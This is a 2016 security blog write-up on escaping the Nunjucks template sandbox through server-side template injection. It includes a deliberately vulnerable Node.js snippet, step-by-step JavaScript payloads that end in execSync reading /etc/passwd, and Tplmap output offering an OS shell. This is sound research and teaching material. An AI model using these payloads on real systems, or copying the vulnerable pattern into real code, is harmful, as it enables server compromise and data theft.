---
comments: true
date: 2016-08-02 12:58:30
layout: post
slug: 2016-08-02-sandbox-break-out-nunjucks-template-engine
title: Sandbox Breakout - A view Of The Nunjucks Template Engine
categories:
- Security
- Vulnerabilities
- Web Apps
tags:
- CVE-2014-5073
- advisory
- vmturbo
- pentesting
- security
- vulnerability
- rce
- cgi
- command execution 
---

Introduction
------------

This write-up describes a sandbox escape technique on Nunjucks template engine implemented by [Tplmap](https://github.com/epinna/tplmap), a tool to exploit Server-Side Template Injection vulnerabilities (SSTI) and achieve remote command execution on the operating system. Thanks to [Andrea](https://github.com/cyrus-and) who has worked with me on this analysis.

Nunjucks
--------

[Nunjucks](https://mozilla.github.io/nunjucks/) is a template engine for by Jinja2 used to develop web applications on Node.js web frameworks as [Express](http://expressjs.com/) or [Connect](https://github.com/senchalabs/connect#readme). The snippet from a Connect application serves a web page (`http://localhost:15004/page?name=John`) which suffers from Server-Side Template Injection vulnerability.

```javascript
app.use('/page', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);
    var name = url_parts.query.name;
    
    // Include user-input in the template
    var template = 'Hello ' + name + '!'; 
    
    rendered = nunjucks.renderString(
      str = template
    );
    res.end(rendered);
  }
});
```


{% raw %}

The user controllable `name` GET parameter is concatenated to the template string instead of being passed as `context` argument, introducing the SSTI vulnerability. The vulnerable parameter can be detected injecting a basic operation which is evaluated at rendering time.

```bash
$ curl -g 'http://localhost:15004/page?name={{7*7}}'
Hello 49!
$
```

The vulnerability does not affect Nunjucks itself, but is introduced when the user’s input is directly concatenated to a template.

Sandbox escape
--------------

As many other template engines, Nunjucks template code runs in a sandboxed environment. Any global object is stripped out from the environment, to limit the surface which could be used to break out of the sandbox and execute arbitrary JavaScript. You can use Tplmap `--tpl-shell` option to inspect the sandbox surface.

Calling the global object `console` from within the template raises an undefined exception.

```javascript
{{console.log(1)}}

// Template render error: (unknown path)
//  Error: Unable to call `console["log"]`, which is undefined or falsey
```

Luckily for the attacker the documentation describes three utility functions [range, cycler, and joiner](https://mozilla.github.io/nunjucks/templating.html#global-functions) which are the only callables from within the template.

The `constructor` property of any function is the [Function constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) which allows to create a new function starting from the body string. 

```javascript
{{range.constructor("console.log(123)")()}}
// 123
```

The code above is correctly evaluated. The operating system access instead is not straightforward since `require()` cannot be used to import standard modules without triggering an exception.

```javascript
{{range.constructor("return require('fs')")()}}

//Template render error: (unknown path)
//  ReferenceError: require is not defined
```

The missing `require`constraint can be bypassed using `global.process.mainModule.require`. In the snippet below, the module `fs` is imported and printed.

```javascript
{{range.constructor("return global.process.mainModule.require('fs')")()}}

[object Object]
```

Finally, the exploit to access the underlying operating system can be finalised executing `tail /etc/passwd` via the `child_process.execSync()` method.

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
```

Tplmap integration
------------------

The sandbox escape technique has been integrated in Tplmap Nunjucks plugin to compromise the target in a fully automated way.

```bash
$ ./tplmap.py -u http://localhost:15004/page?name=* --engine Nunjucks --os-shell
[+] Tplmap 0.1
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Found placeholder in GET parameter 'name'
[+] Nunjucks plugin is testing rendering with tag '{{*}}'
[+] Nunjucks plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  Engine: Nunjucks
  Injection: {{*}}
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Code evaluation: yes, javascript code
   Shell command execution: yes
   File write: yes
   File read: yes
   Bind and reverse shell: yes

[+] Run commands on the operating system

linux $ tail /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
```

[Tplmap](https://github.com/epinna/tplmap) support of new template engines can be easily extended writing plugins. All contributions are greatly appreciated, both code or ideas of sandbox escapes of new template engines. Submit your sandbox break-out idea or code via Github issues and pull request.

{% endraw %}
